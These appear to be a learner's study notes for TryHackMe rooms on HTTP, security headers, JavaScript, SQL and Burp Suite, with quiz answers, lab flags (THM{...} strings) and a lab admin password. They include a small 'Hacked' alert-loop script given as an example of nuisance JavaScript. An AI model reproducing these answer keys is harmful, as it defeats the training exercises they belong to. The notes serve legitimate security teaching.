
# Web Application Basics 

## Web Application Overview 

**Front End (Client-Side):**

- **HTML (Hypertext Markup Language):** Defines the structure and content of web pages using tags and elements.
- **CSS (Cascading Style Sheets):** Controls presentation — layout, colors, fonts, and overall visual styling.
- **JavaScript (JS):** Adds interactivity and logic; enables dynamic updates, event handling, and client-side computations.

**Back End (Server-Side):**

- **Web Server:** Handles client requests (HTTP/HTTPS), serves web pages, and communicates with application and database servers. Examples: Apache, Nginx.
- **Application Server:** Executes server-side logic, processes user inputs, and manages communication between web server and database. Examples: Node.js, Django, Flask, Spring.
- **Database:** Stores, retrieves, and manages structured or unstructured data used by the application. Examples: MySQL, PostgreSQL, MongoDB.
- **Infrastructure:** Includes networking, storage, and system components that support scalability, performance, and availability.
- **WAF (Web Application Firewall):** Security layer that filters and monitors HTTP traffic, protecting against attacks like SQL injection, XSS, and CSRF.

Q: Which component on a computer is responsible for hosting and delivering content for web applications ?
A: web server 

Q: Which tool is used to access and interact with web applications ?
A: web browser 

Q: Which component acts as a protective layer, filtering incoming traffic to block malicious attacks, and ensuring the security of the web application ? 
A: web application firewall 

## Uniform Resource Locator 

A **URL (Uniform Resource Locator)** is a web address that specifies the exact location of a resource on the Internet and the method to access it.

**Components:**

![[34ad66d8b90aaaa35f9536d3b152ea97.png]]

1. **Scheme:**
    
    - Defines the protocol used for communication.
    - Common: `http://`, `https://`, `ftp://`.
    - **HTTPS** adds encryption via SSL/TLS for secure data transfer.
2. **User Info (Optional):**
    
    - Format: `username:password@host`.
    - Used for authentication but rarely implemented due to **security risks** (can expose credentials).
    
3. **Host/Domain:**
    
    - Identifies the web server or domain name (e.g., `www.example.com`).
    - Unique and registered via domain registrars.
    - Watch for **typosquatting** or spoofed domains (used in phishing).
    
4. **Port:**
    
    - Specifies the communication port on the server.
    - Default: **80 (HTTP)**, **443 (HTTPS)**.
    - Custom ports indicate non-standard services (e.g., `:8080`).
    
5. **Path:**
    
    - Indicates the specific resource or directory on the server (e.g., `/login`, `/images/logo.png`).
    - Must be **access-controlled** to prevent unauthorized access.
    
6. **Query String:**
    
    - Begins with `?`, followed by key-value pairs (`?id=10&user=admin`).
    - Used for parameters in dynamic content or form submissions.
    - Must be **validated/sanitized** to prevent **injection attacks**.
    
7. **Fragment:**
    
    - Begins with `#`, refers to a specific section of a page (`#section1`).
    - Handled client-side (not sent to the server).
    - Should still be sanitized to avoid **malicious script injection**.


## HTTP messages 

HTTP messages are data packets exchanged between a **client** and a **server** to request and deliver web resources.

**Types:**

- **Request:** Sent by client (e.g., `GET`, `POST`).
- **Response:** Sent by server with status and content.

**Structure:**

1. **Start Line:**
    
    - Request → `METHOD URL VERSION` (e.g., `GET /index.html HTTP/1.1`)
    - Response → `VERSION STATUS_CODE STATUS_MESSAGE` (e.g., `HTTP/1.1 200 OK`)
    
2. **Headers:** Key-value pairs with info (e.g., `Host`, `Content-Type`, `Authorization`).

3. **Empty Line:** Separates headers from body.

4. **Body:** Contains data (form input, HTML, JSON, etc.).

**Common Status Codes:**  
`200 OK`, `301 Moved`, `400 Bad Request`, `401 Unauthorized`, `404 Not Found`, `500 Server Error`.

**Importance:**

- Enables client-server communication.
- Aids debugging and performance tuning.
- Crucial for web security and data protection.

Q: Which HTTP message is returned by the web server after processing a client's request ? 
A: HTTP response 

Q: What follows the headers in an HTTP message ? 
A: Empty Line 

## HTTP Request 

An **HTTP request** is sent by a client to a web server to request or modify resources on a web application.

![[5f04259cf9bf5b57aed2c476-1730445201524.png]]

### 1. Structure

- **Request Line:** `METHOD /path HTTP/version`  
    Example: `GET /login HTTP/1.1`

### 2. HTTP Methods

| Method      | Purpose                 | Security Note                          |
| ----------- | ----------------------- | -------------------------------------- |
| **GET**     | Retrieve data           | Don’t expose sensitive info in URL.    |
| **POST**    | Send data               | Validate inputs to prevent injections. |
| **PUT**     | Update resource         | Check user authorization.              |
| **DELETE**  | Remove resource         | Restrict access to authorized users.   |
| **PATCH**   | Partial update          | Validate and sanitize input.           |
| **HEAD**    | Retrieve headers only   | Used for metadata checks.              |
| **OPTIONS** | Show allowed methods    | Disable if not required.               |
| **TRACE**   | Debugging               | Disable for security.                  |
| **CONNECT** | Establish secure tunnel | Used for HTTPS.                        |

### 3. URL Path

- Identifies the target resource (e.g., `/api/users/123`).
- Must be **validated and sanitized** to prevent unauthorized access or injection attacks.

### 4. HTTP Versions

|Version|Key Features|
|---|---|
|**0.9**|Only GET supported.|
|**1.0**|Added headers, basic caching.|
|**1.1**|Persistent connections, chunked data.|
|**2.0**|Multiplexing, compression, faster.|
|**3.0**|Uses QUIC, more secure and faster.|

### 5. Common Request Headers

|Header|Example|Purpose|
|---|---|---|
|**Host**|`Host: tryhackme.com`|Target server name.|
|**User-Agent**|`Mozilla/5.0`|Client info.|
|**Referer**|URL of previous page.||
|**Cookie**|Session/user data.||
|**Content-Type**|Data format (e.g., `application/json`).||

### 6. Request Body Formats

| Format          | Description                     | Example Use       |
| --------------- | ------------------------------- | ----------------- |
| **URL Encoded** | `key=value&key2=value2`         | Simple form data. |
| **Form Data**   | `multipart/form-data`           | File uploads.     |
| **JSON**        | `{ "name":"user" }`             | API data.         |
| **XML**         | `<user><name>...</name></user>` | Legacy systems.   |

Q: Which HTTP protocol version became widely adopted and remains the most commonly used version for web communication, known for introducing features like persistent connections and chunked transfer encoding?
A: HTTP/1.1

Q: Which HTTP request method describes the communication options for the target resource, allowing clients to determine which HTTP methods are supported by the web server ? 
A: OPTIONS 

Q: In an HTTP request, which component specific the specific resource or endpoint the web server that the client is requesting, typically appearing the domain name in the URL ? 
A: URL Path 

Q: Which HTTP request header specifies the domain name of the web server to which the request is being sent ?
A: Host 

Q: What is the default content type for form submissions in an HTTP request where the data is encoded as key=value pairs in a query string format ? 
A: application/x-www-form-urlencoded 

Q: Which part of an HTTP request contains additional information like host, user agent, content type, guiding how the web server should process the request ? 
A: Request Headers 

## HTTP Response 

An **HTTP response** is sent by the server to the client after processing a request, indicating success or failure and returning any requested data.

![[5f04259cf9bf5b57aed2c476-1741854427607.svg]]

### 1. Structure

- **Status Line:** `HTTP/version Status_Code Reason_Phrase`  
    Example: `HTTP/1.1 200 OK`

### 2. Status Code Categories

| Code Range  | Meaning       | Example                     |
| ----------- | ------------- | --------------------------- |
| **100–199** | Informational | `100 Continue`              |
| **200–299** | Success       | `200 OK`                    |
| **300–399** | Redirection   | `301 Moved Permanently`     |
| **400–499** | Client Error  | `404 Not Found`             |
| **500–599** | Server Error  | `500 Internal Server Error` |

### Common Response Headers

|Header|Example|Purpose|
|---|---|---|
|**Date**|`Date: Fri, 23 Aug 2024 10:43:21 GMT`|Shows response time.|
|**Content-Type**|`text/html; charset=utf-8`|Defines data type and encoding.|
|**Server**|`Server: nginx`|Identifies server software (can be hidden for security).|
|**Set-Cookie**|`Set-Cookie: sessionId=abc; HttpOnly; Secure`|Manages sessions; use secure flags.|
|**Cache-Control**|`Cache-Control: no-cache`|Controls caching behavior.|
|**Location**|`Location: /login`|Used for redirects (3xx).|
### 4. Response Body

- Contains actual data (HTML, JSON, XML, images, etc.).
- Always **sanitize and escape output** to prevent **XSS or injection attacks**.

Q: What part of an HTTP response provides the HTTP version, status code, and a brief explanation of the response's outcome ? 
A: Status Line 

Q: Which category of HTTP response codes indicates that the web server encountered an internal issue or is unable to fulfil the client's request ? 
A: Server Error Responses 

Q: Which HTTP status code indicates that the requested resources could not be found on the web server ? 
A: 404

Q: Which HTTP response header can reveal information about the web server's software and version, potentially exposing it to security risks if not removed ? 
A: Server 

Q: Which flag should be added to cookies in the Set-Cookie HTTP response header to ensure they are only transmitted over HTTPS, protecting them from being exposed during unencrypted transmissions ? 
A: Secure 

Q: Which flag should be added to cookies in the Set-Cookie HTTP response header to prevent them from being accessed via JavaScript, thereby enhancing security against XSS attacks ? 
A: HttpOnly 

## Security Headers 

HTTP Security Headers strengthen web application security by mitigating attacks like **XSS**, **clickjacking**, and **data leaks**.
### 1. Content-Security-Policy (CSP)

- Restricts what sources can load content (scripts, styles, etc.).
- Prevents XSS and code injection attacks.  
    **Example:**  
    `Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.tryhackme.com; style-src 'self'`  
    **Directives:**
    
- `default-src`: Default allowed sources.
- `script-src`: Allowed script sources.
- `style-src`: Allowed stylesheet sources.

### **2. Strict-Transport-Security (HSTS)**

- Forces browsers to use **HTTPS** only.  
    **Example:**  
    `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`  
    **Directives:**
    
- `max-age`: Duration (in seconds) for HTTPS enforcement.
- `includeSubDomains`: Applies to all subdomains.
- `preload`: Adds to browser preload list.

### 3. X-Content-Type-Options

- Prevents MIME type sniffing to reduce drive-by attacks.  
**Example:**  
    `X-Content-Type-Options: nosniff`  
    **Directive:**
	- `nosniff`: Forces browser to respect `Content-Type`.

### 4. Referrer-Policy

- Controls how much referrer info is sent in requests.  
    **Examples:**  
    `Referrer-Policy: no-referrer | same-origin | strict-origin | strict-origin-when-cross-origin`  
    **Directives:**
    
- `no-referrer`: Sends no referrer data.
- `same-origin`: Sends referrer only within same site.
- `strict-origin`: Sends origin only over HTTPS.
- `strict-origin-when-cross-origin`: Sends full referrer for same-origin, origin-only for cross-origin.

Q: In a Content Security Policy (CSP) configuration, which property can be set to define where scripts can be loaded from ? 
A: script-src 

Q: When configuring the Strict-Transport-Security (HSTS) header to ensure that all subdomains of a site also use HTTPS, which directive should be includded to apply the security policy to both the main domain and its subdomains ? 
A: include SubDomains 

Q: Which HTTP header directive is used to prevent browsers from interpreting files as different MIME type than what is specified by the server, thereby mitigating content type sniffing attacks ? 
A: nosniff

## Practical Task 

Q: Make a GET request to /api/users/. What is the flag ? 
A: THM{YOU_HAVE_JUST_FOUND_THE_USER_LIST}

Q: Make a POST request to /api/users/2 and update the country of Bob from UK to US. What is the flag  ?
A: THM{YOU_HAVE_MODIFIED_THE_USER_DATA}

Q: Make a DELETE request to /api/user/1 to delete the user. What is the flag ? 
A: THM{YOU_HAVE_JUST_DELETED_A_USER}

# JavaScript Essentials 

## Essential Concepts 

**Variables:** Used to store data values. Declared using `var`, `let`, or `const`.

- `var` → function-scoped
- `let` and `const` → block-scoped (better control in code blocks)  
    `const` values cannot be reassigned.

**Data Types:** Define the kind of data a variable can hold — `string`, `number`, `boolean`, `null`, `undefined`, and `object` (used for arrays and complex data).

**Functions:** Reusable blocks of code used to perform specific tasks. 

Example:
```javascript
function PrintResult(rollNum) {
    console.log("Roll number " + rollNum + " passed");
}
```
Functions help avoid code repetition by executing logic dynamically when called.

**Loops:** Used to execute a code block repeatedly while a condition is true. Common loops include `for`, `while`, and `do...while`. 

Example:
```javascript
for (let i = 0; i < 100; i++) {
    PrintResult(rollNumbers[i]);
}
```

**Request-Response Cycle:** The client (browser) sends an HTTP request to the server, and the server responds with data (like HTML or JSON). This process defines how web applications communicate.

Q: What term allows you to run a code block multiple times as long as it is a condition ? 
A: loop 

## JavaScript  Overview 

JavaScript is an **interpreted**, **client-side scripting** language that runs directly in the browser **without compilation**. It’s used to create **dynamic and interactive** web applications.

**Example Program:**

```javascript
console.log("Hello, World!"); // Output to console

let age = 25; // Variable (Number type)

if (age >= 18) {
    console.log("You are an adult."); // Control flow
} else {
    console.log("You are a minor.");
}

function greet(name) { // Function definition
    console.log("Hello, " + name + "!");
}

greet("Bob"); // Function call

```

**Key Concepts:**

- **Variables:** Store data values using `let`, `const`, or `var`.
- **Data Types:** Define what kind of value a variable holds (number, string, etc.).
- **Control Flow:** Uses conditions (`if...else`) to decide execution paths.
- **Functions:** Group reusable code for specific tasks.

Q: What is the code output if the value of x is changed to 10 ? 
A: The result is: 20

Q: Is JavaScript compiled or interpreted language ? 
A: Interpreted 

## Integrating JavaScript in HTML 

### 1. Internal JavaScript

- **Definition:** JS code written directly inside the HTML file within `<script>` tags.
    
- **Placement:**
    
    - `<head>` – for scripts that run **before** page content loads.
    - `<body>` – for scripts that **interact** with page elements.
    
- **Example:**

```html
<script>
    let x = 5, y = 10;
    document.getElementById("result").innerHTML = "Result: " + (x + y);
</script>

```

- **Use case:** Simple pages, testing, learning.
- **Output:** JS runs when browser loads the HTML file.

### External JavaScript

- **Definition:** JS code stored in a **separate `.js` file** and linked using the `src` attribute.

- **Example:**

- script..js 

```javascript
let x = 5, y = 10;
document.getElementById("result").innerHTML = "Result: " + (x + y);
```

- external.html

```html
<script src="script.js"></script>
```

- **Advantages:**
    
    - Cleaner HTML structure.
    - Reusable and maintainable code.
    - Easier debugging for large projects.
### 3. Verifying JS Type (Internal vs External)

- **In Chrome:**
    
    - Right-click → **View Page Source**.  
    - **Internal JS:** `<script> ... </script>` (no `src`).
    - **External JS:** `<script src="file.js"></script>`.

Q: Which type of JavaScript integration places the code directly within the HTML document ?
A: internal 

Q: Which method is better for reusing JS across multiple web pages ? 
A: External 

Q: What is the name of the external JS file that is being called by external_test.html ? 
A: thm_external.js

Q: What attribute links an external JS file in the \<script> tag ? 
A: src 

## Abusing Dialogue Functions 

JavaScript enables interaction with users through dialogue boxes and dynamic content updates. Common built-in functions are `alert()`, `prompt()`, and `confirm()`.

### 1. Alert

- Displays a message in a dialogue box with an **“OK”** button.
- Used to show information or warnings.
- Example:
```js
alert("Hello THM");
```
- Executed in the **Chrome console** → shows a pop-up message.


### 2. Prompt

- Displays a dialogue box asking the user for input.
- Returns the entered value on **OK**, or `null` on **Cancel**.
- Example:
```js
name = prompt("What is your name?");
alert("Hello " + name);	  
```

- Used to collect user input and display customized messages.

### 3. Confirm

- Displays a dialogue box with **“OK”** and **“Cancel”** buttons.
- Returns `true` if **OK** is clicked, `false` if **Cancel**.
- Example:
	```js
	confirm("Do you want to proceed?");
	```
### 4. How Hackers Exploit the Functionality

- Attackers can misuse JS dialog functions to cause inconvenience or harm.
- Example malicious code:
```html
  <script>
    for (let i = 0; i < 3; i++) {
        alert("Hacked");
    }
</script>
  ```

- Increasing the loop count (e.g., 500) forces users to close multiple alerts manually.
- Such attacks demonstrate the risk of running **untrusted JS or HTML files**.
### 5. Key Takeaway

- Only execute JS from **trusted sources**.
- Malicious scripts can disrupt browsing or lead to further attacks like **Cross-Site Scripting (XSS)**.

Q: In the `invoice.html`, how many times does the code show the alert Hacked ? 
A: 5 

Q: Which is one of the JS interactive elements should be used to display a dialogue box that asks the user for input ? 
A: prompt

Q: If the user enters Tesla, what value is stored in the carName = prompt("What is your car name?") in the carName variable ? 
A: Tesla

## Bypassing Control Flow Statements 

Control flow determines the order statements and blocks run. JavaScript provides decision-making and repetition structures to handle different conditions and repeat actions.
## Key Structures

- **Conditionals:** `if`, `else` — run code based on boolean conditions.
- **Switch:** multi-branch decision based on a value.
- **Loops:** `for`, `while`, `do...while` — repeat actions while conditions hold.
```html 
<!DOCTYPE html>
<html lang="en">
<head><title>Age Verification</title></head>
<body>
  <h1>Age Verification</h1>
  <p id="message"></p>

  <script>
    age = prompt("What is your age")
    if (age >= 18) {
      document.getElementById("message").innerHTML = "You are an adult.";
    } else {
      document.getElementById("message").innerHTML = "You are a minor.";
    }
  </script>
</body>
</html>

```

- `prompt()` collects input; `if (age >= 18)` decides which message to show by updating the DOM element `#message`.

Q: What is the message displayed if you enter the age less than 18 ?
A: 18

Q: What is the password for the user admin ?
A: ComplexPassword 

## Exploring minified Files 

**Minification**

- **Process**: remove unnecessary characters (spaces, newlines, comments) and shorten identifiers.
- **Purpose**: reduce file size and improve page load time in production.
- **Result**: functionally identical JS but harder for humans to read.

**Obfuscation**

- **Process**: transform code by renaming variables/functions to meaningless names, inserting dummy code, and producing complex constructs. [website](https://codebeautify.org/javascript-obfuscator)
- **Purpose**: make code deliberately difficult to understand/analysis while remaining executable by the browser.
- **Result**: “gibberish” code that still runs correctly.

**Deobfuscation**

- Use online deobfuscator tools: paste obfuscated code → tool returns a human-readable equivalent.[website](https://obf-io.deobfuscate.io/)
- The deobfuscated output can reveal the original logic for analysis or review.

**Key point**

- Minified/obfuscated JS remains fully functional; use deobfuscation tools to recover readable code when analysis is required.

Q: What is the alert message shown after running the file hello.html ?
A: Welcome to THM 

Q: What is the value of the age variable in the following obfuscated code snippet ? age=0x10\*x247e+0x35*-0x2e+-0x1ae3;
A: 21

## Best Practices 

### 1. Avoid Relying on Client-Side Validation Only

- JS validation can be bypassed by disabling or modifying scripts.
- **Always perform server-side validation** in addition to client-side checks.
### 2. Refrain from Adding Untrusted Libraries

- Verify the source of external JS libraries before including them with the `<script src="">` tag.
- Attackers often upload **malicious look-alike libraries**.    
- Use trusted CDNs or verified repositories only.
### 3. Avoid Hardcoded Secrets

- Never include sensitive data (API keys, tokens, credentials) in JS files.
- Code in the browser is **publicly visible**.

Q: Is it a good practice to blindly include JS in your code from any source (yea/nay) ? 
A: nay 

# SQL Fundamentals 

## Databases 101 

### Introduction to Databases

**Definition:**  
A **database** is an organized collection of structured data that allows **efficient storage, retrieval, and management**. It’s widely used in applications like authentication systems, social media platforms, and e-commerce sites.

### 1. Types of Databases

![[66c513e4445cb5649e636a36-1727686858009.png]]

#### a. Relational Databases (SQL)

- Store **structured data** in tables (rows & columns).
- Relationships are defined between tables using **keys**.
- Ideal for consistent, well-structured data (e.g., transactions, user records).
- Examples: MySQL, PostgreSQL, Oracle.

#### b. Non-Relational Databases (NoSQL)

- Store **unstructured or semi-structured data** (documents, key-value pairs, etc.).
- No fixed schema; supports flexibility and scalability.
- Ideal for varied data formats like social media content.
- Examples: MongoDB, CouchDB, Redis.

### 2. Relational Database Structure

![[66c513e4445cb5649e636a36-1727686918382.png]]

| Concept        | Description                                                                    |
| -------------- | ------------------------------------------------------------------------------ |
| **Table**      | Collection of related data (e.g., `Books`)                                     |
| **Row**        | Single record (e.g., one book entry)                                           |
| **Column**     | Attribute of data (e.g., `id`, `Name`, `Published_date`)                       |
| **Data Types** | Define the kind of data a column can hold (e.g., String, Integer, Float, Date) |
### 3. Keys in Databases

- **Primary Key:**  
    Uniquely identifies each record in a table. Only one per table.  
    Example: `id` column in `Books` table.    
- **Foreign Key:**  
    Creates a relationship between two tables by referencing a primary key in another table.  
    Example: `author_id` in `Books` table referencing `id` in `Authors` table.


Q: What type of database should you consider using if the data you're going to be storing will vary greatly in its format ? 
A: Non-relational database 

Q: What type of database should you consider using if the data you're going to be stored will reliably be in the same structured format ? 
A: relational database 

Q: In our example, once a record of a book is inserted into our "Books" table, it would be represented as a __ in that table ? 
A: row 

Q: Which type of key provides a link from one table to another ? 
A: foreign key 

Q: Which type of key ensures a record is unique within a table ? 
A: primary key 

## SQL 


- SQL stands for **Structured Query Language**    
- It is used to **interact with relational databases**.
- Databases are managed using a **Database Management System (DBMS)** like MySQL, Oracle, MongoDB, or MariaDB.
- SQL allows users to **query, define, and manipulate** data.

**Benefits of SQL:**

- **Fast:** Quickly retrieves large amounts of data.
- **Easy to learn:** Uses simple, English-like syntax.
- **Reliable:** Enforces structured and accurate data storage.
- **Flexible:** Enables powerful and efficient data analysis.

Q: What serves as an interface between a database and an end user ? 
A: DBMS 

Q: What query language can be used to interact with a relational database ? 
A: SQL 


## Database and Table Statements 

### 1. Database Statements

- **CREATE DATABASE** – Creates a new database.  
    → `CREATE DATABASE database_name;`    
- **SHOW DATABASES** – Displays all available databases.  
    → `SHOW DATABASES;`
- **USE** – Selects a database to work with.  
    → `USE database_name;`
- **DROP DATABASE** – Deletes an existing database.  
    → `DROP DATABASE database_name;`

### Table Statements

- **CREATE TABLE** – Creates a new table inside a selected database. 
    → Example:
	```sql
	CREATE TABLE book_inventory (
    book_id INT AUTO_INCREMENT PRIMARY KEY,
    book_name VARCHAR(255) NOT NULL,
    publication_date DATE
);
	```

- **SHOW TABLES** – Lists all tables in the active database.  
    → `SHOW TABLES;`
- **DESCRIBE / DESC** – Displays table structure (columns, data types, keys).  
    → `DESCRIBE table_name;`
- **ALTER TABLE** – Modifies an existing table (add, remove, or change columns).  
    → Example: `ALTER TABLE book_inventory ADD page_count INT;`
- **DROP TABLE** – Deletes a table permanently.  
    → `DROP TABLE table_name;`

Q: Using the statement you've learned to list all databases, it should reveal a database with a flag for a name; what is it  ?
A: THM{575a947132312f97b30ee5aeebba629b723d30f9}

Q: In the list of available databases, you should also see the `task_4_db` database. Set this as your active database and list all tables in this database; wha tis the flag present here ?
A: THM{692aa7eaec2a2a827f4d1a8bed1f90e5e49d2410}

## CRUD Operations 

CRUD stands for **Create, Read, Update, and Delete** — the four basic operations used to manage data in a database.

**1. Create (INSERT)**

- Adds a new record to a table.
```sql
INSERT INTO books (id, name, published_date, description)
VALUES (1, "Android Security Internals", "2014-10-14", "An In-Depth Guide...");
```

**2. Read (SELECT)**

- Retrieves data from a table.
    
    - All columns:
    ```sql
    SELECT * FROM books;
    ```
	- Specific columns: 
	```sql
	SELECT name, description FROM books;
	```

**3. Update (UPDATE)**

- Modifies existing records in a table.
```sql
UPDATE books
SET description = "Updated description."
WHERE id = 1;
```

**4. Delete (DELETE)**

- Removes records from a table.
```sql
DELETE FROM books WHERE id = 1;
```


Q: Using the `tools_db` database, what is the name of the tool in the `hacking_tools` that can be used to perform man-in-the-middle attacks on wireless networks ? 
A: Wi-Fi pineapple

Q: Using the tools_db database, what is the shared category for both USB Rubber Ducky and Bash Bunny ? 
A: USB attacks 

## Clauses 

**Clause:** Part of an SQL statement that specifies how data is manipulated or retrieved.

### 1. DISTINCT Clause

- Removes **duplicate records** from query results.
- **Example:**
	```sql
	SELECT DISTINCT name FROM books;
```
- Returns only unique values 

### 2. GROUP BY Clause

- **Groups rows** that have the same values into summary rows.
- Often used with **aggregate functions** like COUNT(), SUM(), AVG().
- **Example:**
```sql
SELECT name, COUNT(*) FROM books GROUP BY name;
```

### 3. ORDER BY Clause

- **Sorts** query results in ascending (`ASC`) or descending (`DESC`) order.
- **Example:**
```sql
SELECT * FROM books ORDER BY published_date ASC;
SELECT * FROM books ORDER BY published_date DESC;
```

### 4. HAVING Clause

- Used to **filter groups** created by `GROUP BY`.
- Similar to `WHERE` but works on **aggregated data**.
- **Example:**
```sql
SELECT name, COUNT(*) FROM books
GROUP BY name
HAVING name LIKE '%Hack%';
```

Q: Using the tools_db database, what is the total number of distince categories in the hacking_tools table ?
A: 6 

Q: Using the tools_db database, What is the first tool (by name ) in ascending order from the hacking_tools table ? 
A: Bash_Bunny

Q: Using the tools_db database, What is the first tool (by name ) in decending order from the hacking_tools table ? 
A: Wi-Fi Pineapple 

## Operators 

### 1. Logical Operators

Used to test conditions and return **TRUE** or **FALSE**.

- **LIKE** – Filters data using a pattern.
```sql
WHERE description LIKE "%guide%";
```
- → Returns rows containing the word _guide_.
    
- **AND** – Returns TRUE if **all conditions** are true.
```sql
WHERE category="Offensive Security" AND name="Bug Bounty Bootcamp";
```

- **OR** – Returns TRUE if **any condition** is true.
```sql
WHERE name LIKE "%Android%" OR name LIKE "%iOS%";
```

- **NOT** – Reverses a condition.
```sql
WHERE NOT description LIKE "%guide%";
```

- **BETWEEN** – Checks if a value is within a **range**.
```sql
WHERE id BETWEEN 2 AND 4;
```

### 2. Comparison Operators

Used to **compare** two values.

- **=** → Equal to
```sql
WHERE name = "Designing Secure Software";
```

- **!=** → Not equal to
```sql
WHERE category != "Offensive Security";
```

- **<** → Less than
```sql
WHERE published_date < "2020-01-01";
```

- **>** → Greater than
```sql
WHERE published_date > "2020-01-01";
```

- **<=** → Less than or equal to
```sql
WHERE published_date <= "2021-11-15";
```

- **>=** → Greater than or equal to
```sql
WHERE published_date >= "2021-11-02";
```


Q: Using the `tools_db` database, which tool under the Multi-tool category and is useful for pen testers and geeks ? 
A: Flipper Zero 

Q: Using the `tools_db` database, what is the category of tools with an amount greater than or equal to 300 ? 
A: RFID cloning 

Q: Using the `tools_db` database, which tools falls under the Network intelligence category with an amount less than 100 ? 
A: Lan Turtle 

## Functions 

### String Functions

Used to perform operations on text data.

- **`CONCAT()`** → Combines multiple strings into one.  
    _Example:_  
    `SELECT CONCAT(name, " is a type of ", category, " book.") AS book_info FROM books;`
    
- **`GROUP_CONCAT()`** → Merges multiple row values into a single string.  
    _Example:_  
    `SELECT category, GROUP_CONCAT(name SEPARATOR ", ") FROM books GROUP BY category;`
    
- **`SUBSTRING()`** → Extracts a portion of a string.  
    _Example:_  
    `SELECT SUBSTRING(published_date, 1, 4) AS published_year FROM books;`
    
- **`LENGTH()`** → Returns the number of characters in a string.  
    _Example:_  
    `SELECT LENGTH(name) AS name_length FROM books;`
    
### Aggregate Functions

Used to perform calculations across multiple rows.

- **`COUNT()`** → Counts total records.  
    `SELECT COUNT(*) AS total_books FROM books;`
    
- **`SUM()`** → Adds up numeric values.  
    `SELECT SUM(price) AS total_price FROM books;`
    
- **`MAX()`** → Finds the maximum value.  
    `SELECT MAX(published_date) AS latest_book FROM books;`
    
- **`MIN()`** → Finds the minimum value.  
    `SELECT MIN(published_date) AS earliest_book FROM books;`
    
- `MOD()` → Finds the reminder 
	- `SELECT MOD(amount, 10) FROM books;`


Q: Using the `tools_db` database, what is the tools with the longest name based on character length ?
A: USB Rubber Ducky 

Q: Using the `tools_db` database, what is the total sum of all tools ?
A: 1444

Q: Using the `tools_db` database, what are the tool names where the amount does not end in 0, and group the tool names concatenated by "&". 
A: Flipper Zero & iCopy-XS


# Burp Suite: The Basics 

## What is Burp Suite 


- **Burp Suite** is a **Java-based framework** for **web application penetration testing**.
- It captures and allows manipulation of **HTTP/HTTPS traffic** between a browser and server.
- Enables **interception, viewing, and modification** of requests and responses — essential for manual web testing.    
- Widely used for **web, mobile, and API security assessments**.

### Key Editions

1. **Community Edition (Free)**
    
    - For non-commercial use.
    - Offers core manual testing tools (proxy, repeater, etc.).

2. **Professional Edition (Paid)**
    
    - Unrestricted version with advanced features:
    
        - Automated vulnerability scanner.
        - Powerful fuzzer/brute-forcer.
        - Project saving & report generation.
        - Built-in API integration.
        - Custom extensions & Collaborator support.
            
    - Preferred by professional pentesters.
        
3. **Enterprise Edition (Paid)**
    
    - Designed for **continuous automated scanning**.    
    - Runs on a **server** for scheduled vulnerability scans.
    - Similar in concept to **Nessus** for infrastructure scanning.
    
Q: Which edition of Burp Suite runs on a server and provides constant scanning for target web apps ? 
A: Burp Suite Enterprise 

Q: Burp Suite is frequently used when attacking web applications and ___ applications 
 A: Mobile 

## Features of Burp Community 

- Although limited compared to the Professional version, **Burp Suite Community** still offers **powerful tools** essential for manual **web application testing**.
- Core tools include **Proxy, Repeater, Intruder, Decoder, Comparer,** and **Sequencer**.
### Key Features

1. **Proxy**
    
    - Central feature of Burp Suite.
    - Intercepts and modifies **HTTP/HTTPS requests and responses** between browser and server.
        
2. **Repeater**
    
    - Used to **modify and resend requests** multiple times.
    - Ideal for **testing payloads** (e.g., SQLi, XSS) and analyzing endpoint behavior.
        
3. **Intruder**
    
    - Allows **automated attacks** like brute-force or fuzzing (rate-limited in Community edition).
        
4. **Decoder**
    
    - Used for **encoding/decoding data** and transforming payloads efficiently within Burp.
        
5. **Comparer**
    
    - Compares two sets of data **(word or byte level)** to identify differences.
    - Useful for analyzing responses quickly.
        
6. **Sequencer**
    
    - Tests **randomness** of tokens (e.g., session cookies).
    - Detects weak random generation that may lead to security flaws.
### Extensions and Customization

- **Burp Suite Extender** allows adding **custom extensions** to enhance functionality.
- Extensions can be written in **Java, Python (Jython), or Ruby (JRuby)**.
- **BApp Store** provides third-party modules (some require Professional license).
- Example: **Logger++** extension adds advanced logging features.

Q: Which Burp Suite feature allows us to intercept requests between ourselves and the target ? 
A: Proxy

Q: Which Burp tool would we use to brute-force a login form ?
A: Intruder 

## The Dashboard 

The Dashboard is divided into **four quadrants (counter-clockwise from top-left):**

![[11202e4c73faa30a757f1439b63b85c6.png]]

1. **Tasks**
    
    - Manages background tasks.
    - Default: **Live Passive Crawl** (logs visited pages).
    - Professional edition adds more advanced scanning features.
        
2. **Event Log**
    
    - Displays logs of Burp’s actions (e.g., proxy start, connections).
    - Useful for troubleshooting and tracking activity.
        
3. **Issue Activity** _(Professional only)_
    
    - Lists **identified vulnerabilities** ranked by severity and certainty.
        
4. **Advisory** _(Professional only)_
    
    - Provides **details, references, and remediation advice** for detected vulnerabilities.        
    - Supports **exporting reports**.

Q: What menu provides information about the actions performed by Burp Suite, such as starting the proxy, and details about connections made through Burp ?
A: Event log 

## Navigation 

### Interface

- **Navigation** in Burp Suite is managed mainly through **two menu bars** at the top.

### 1. Module Selection (Top Menu Bar)

- The **top row** displays all available **modules** (e.g., Proxy, Repeater, Intruder, etc.).
- Click on a module to **switch** between different Burp Suite tools.
- Example: Selecting **Burp Proxy** opens its related functions.
### 2. Sub-Tabs (Second Menu Bar)

- When a module is selected, a **second menu bar** appears below it.
- These **sub-tabs** provide **module-specific settings** and actions.
- Example: Inside **Burp Proxy**, sub-tabs include **Intercept**, **HTTP History**, and **Options**.

### 3. Detaching Tabs

- Tabs can be **detached into separate windows** for better multitasking.
- To detach:
    1. Click **Window** in the main menu (above the module bar).
    2. Select **Detach** → the selected tab opens in a new window.
- You can **reattach** the tab using the same method.

| Shortcut           | Tab          |
| ------------------ | ------------ |
| `Ctrl + Shift + D` | Dashboard    |
| `Ctrl + Shift + T` | Target tab   |
| `Ctrl + Shift + P` | Proxy tab    |
| `Ctrl + Shift + I` | Intruder tab |
| `Ctrl + Shift + R` | Repeater tab |

Q: Which tab Ctrl + Shift + P will switch us to ? 
A: Proxy tab

## Options 

### 1. Types of Settings

- **Global (User) Settings:**
    
    - Affect the entire Burp Suite installation.  
    - Persist every time you start Burp.
    - Define baseline configuration for the environment.
        
- **Project Settings:**
    
    - Apply only to the **current session/project**.
    - **Not saved** in Burp Suite Community Edition (lost after closing).
### 2. Accessing Settings

- Click the **Settings** button in the **top navigation bar** to open the **settings window**.
### 3. Settings Window Overview

- **Left-side Menu Includes:**
    
